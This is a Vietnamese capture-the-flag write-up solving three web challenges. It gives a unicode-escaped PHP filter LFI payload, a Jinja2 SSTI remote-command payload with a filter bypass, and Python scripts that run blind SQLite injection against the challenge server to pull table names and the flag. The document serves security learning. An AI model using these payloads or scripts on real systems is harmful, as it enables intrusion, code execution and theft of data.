# WannaWinFreshman-Writeup
# Bài 1 Warmup PHP:
![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/63658021-4722-4417-b2ed-48eb746d03fe)

- Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là **page** và sau đó chương trình sẽ server sẽ decode ra và đọc file trong server
- Bài này mới vào thì mình nghĩ đến LFI với filter base64 nhưng khổ nổi là nó chặn ngay chữ php, data, file nên mình không thể chuyển qua base64 được
- Sau gần 30 phút - 1 tiếng thì mình tìm được một bài viết dưới đây [LINK](https://trustfoundry.net/2018/12/20/bypassing-wafs-with-json-unicode-escape-sequences/)
- ![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/c7280b09-24af-47b3-9a0e-e82ed1894471)
- Cơ bản là json_decode nó sẽ decode luôn unicode trong biểu diễn hex vì vậy mình chỉnh lại cái payload của mình từ 
`php://filter/convert.base64-encode/resource=/flag`
thành
`\u0070hp://filter/convert.base64-encode/resource=/flag`
![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/463ea634-efa7-4c42-b0d9-92341d335d5b)
- Decode base64 và ra flag
- Flag: **W1{w3lc0m3_w3b_w4rrj0rs}**
- ~~Funfact: Payload mình ra bài của mình là encode gần như tất cả các ký tự thành dạng unicode biểu diễn hex làm mình tốn rất nhiều thời gian <(")~~
# Bài 2 Namename:
![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/d8bc1de3-0f9a-45ff-9878-141cd0df45ad)
- Bài này cho 1 đường link và không cho thêm gì khác sau khi xem source của web này thì thấy có 1 đường dẫn là `/wannaw1n`
-[image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/c1b22bdc-3266-495f-b6e0-a7edcd95eef0)
- Sau khi đi tới đường dẫn /wannaw1n mình nhận ra ngay đây là SSTI jinja2 ( Mình sẽ nói về rõ cách SSTI này lần sau :v)
- Mình ném ngay payload của mình vào thử xem RCE được không
- Payload : `{{().__class__.__base__.__subclasses__()[279]('ls',shell=1,stdout=-1).communicate()}}`
- Và nó bị chặn ![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/77f0aa01-5dfa-4ad9-9c2b-9e6ba8736812)
- Sau vài thử nghiệm thì có vẽ nó chặn dấu . nên mình chuyển qua |attr

- Payload mới: `{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(279)('ls',shell=1,stdout=-1)|attr('communicate')()}}`
- Và ok nó hoạt động tốt
- Bây giờ sửa lại payload từ `ls` sang `cat flag.txt` thôi
- ![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/28f86e01-25e7-4e51-8e67-9e53225a5f43)
- Và không nó vẫn bị chặn cái gì nên mình sử dụng cách này bypass filter
- `{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(279)('cat+*',shell=1,stdout=-1)|attr('communicate')()}}`
- Cách này sẽ đọc hết tất cả các file trong thư mục hiện tại và tìm được flag
![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/2c578c66-f98c-43dd-a306-e629ab3f7137)
- Flag: **W1{U_are_master_in_SSTI}**
# Bài 3 Solite:
- ![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/5d20fa22-0fc9-4f4c-8039-7de1d61b594f)
- Bài này mình khá tiếc vì mình đọc không kỉ filter nên mình không làm được
- Tóm tắt đề thì bài này chỉ cho chúng ta cái page như này mà làm sao đó mà tìm được flag
- ![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/7d1fe742-a26a-4705-9888-f2d827d562b5)
- Sau khi nghiên cứu và được nghe 1 số gợi ý thì mình hiểu được đây là Blind SQL Injection
- Nhìn kĩ source thì có 1 lỗ hổng cho chúng ta khai thác là substr không bị filter vì trong filter là substrs thứ mà không hề tồn tại
- ![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/ae13e11e-52fe-4bb5-8360-c2095b361fc4)
- Đây là query của bài
  ![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/317e6d80-27b4-41c2-b14b-c4b6e6d84b37)
- Sau một vài thử nghiệm thì mình tìm được các để in ra tên của bảng
- `Payload: 1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),i,1) is 'a'--`
- Tóm tắt :
- Payload này sau khi gửi lên server thì server sẽ thực hiện 1 query như sau `SELECT * FROM API WHERE id LIKE '%1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--%'`
- `select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'` sẽ trả về tên của tất cả các bảng
- `substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1)` sẽ lấy 1 ký tự a bắt đầu từ vị trí i
` 1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--` cái này sẽ so sánh ký tự mà substr vừa cắt ra nếu chính xác thì sẽ thực hiện lệnh đằng trước là `SELECT * FROM API WHERE id LIKE '%1'` và trả về cột id=1 nếu sai thì nó không thực hiện và chẳng trả về gì cả
- Đây là script mình tìm tên của bảng
```py
import string,requests
from urllib.parse import quote

all_characters = string.ascii_letters + string.digits + "!#$%&()+,-/:<=>?@[]^_{}"
url = "http://45.122.249.68:20020/search?name[]="
payload="1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--"
table_name = ""
haha = 0
for i in range(1,10000):
    for ps in all_characters:
        payload ="1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%%'),%d,1) is '%c'--" %(i,ps)
        payload =  quote(payload)
        urlx = url + payload
        #print(urlx)
        r=requests.get(url=urlx)
        if "id" in r.text:
            table_name += ps
            print("Table names: ",table_name)
            haha +=1
    if haha < i:
        break
print("Success all the names of the tables are:",table_name)
```
- Và tìm ra được tên của các bảng là
![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/32f3cf53-f620-48af-8da5-d07cfca0a405)
`Tables: API,flag_c1abd148_acae_40be_a953_eae333f90da0`
- Bây giờ dựa vào cái trên lấy ra flag từ bảng `flag_c1abd148_acae_40be_a953_eae333f90da0` thôi
- Scripting của mình
```py
import string,requests
from urllib.parse import quote

all_characters = string.ascii_letters + string.digits + "!#$%&()+,-/:<=>?@[]^_{}"
url = "http://45.122.249.68:20020/search?name[]="

table_name = "flag_c1abd148_acae_40be_a953_eae333f90da0"
#payload = "1' and substr((select flag from flag_c1abd148_acae_40be_a953_eae333f90da0),1,1) is 'a'--"
haha = 0
flag =""
for i in range(1,10000):
    for ps in all_characters:
        payload ="1' and substr((select flag from %s),%d,1) is '%c'--" %(table_name,i,ps)
        payload =  quote(payload)
        urlx = url + payload
        #print(urlx)
        r=requests.get(url=urlx)
        if "id" in r.text:
            flag += ps
            print("Flag is: ",flag)
            haha +=1
    if haha < i:
        break
print("Here is your flag:",flag)
```
- Flag: **W1{I_th1nk_u_r_so_lite^_^}**
- ~~**Mấy bài còn lại mình chưa biết làm do dark quá**~~









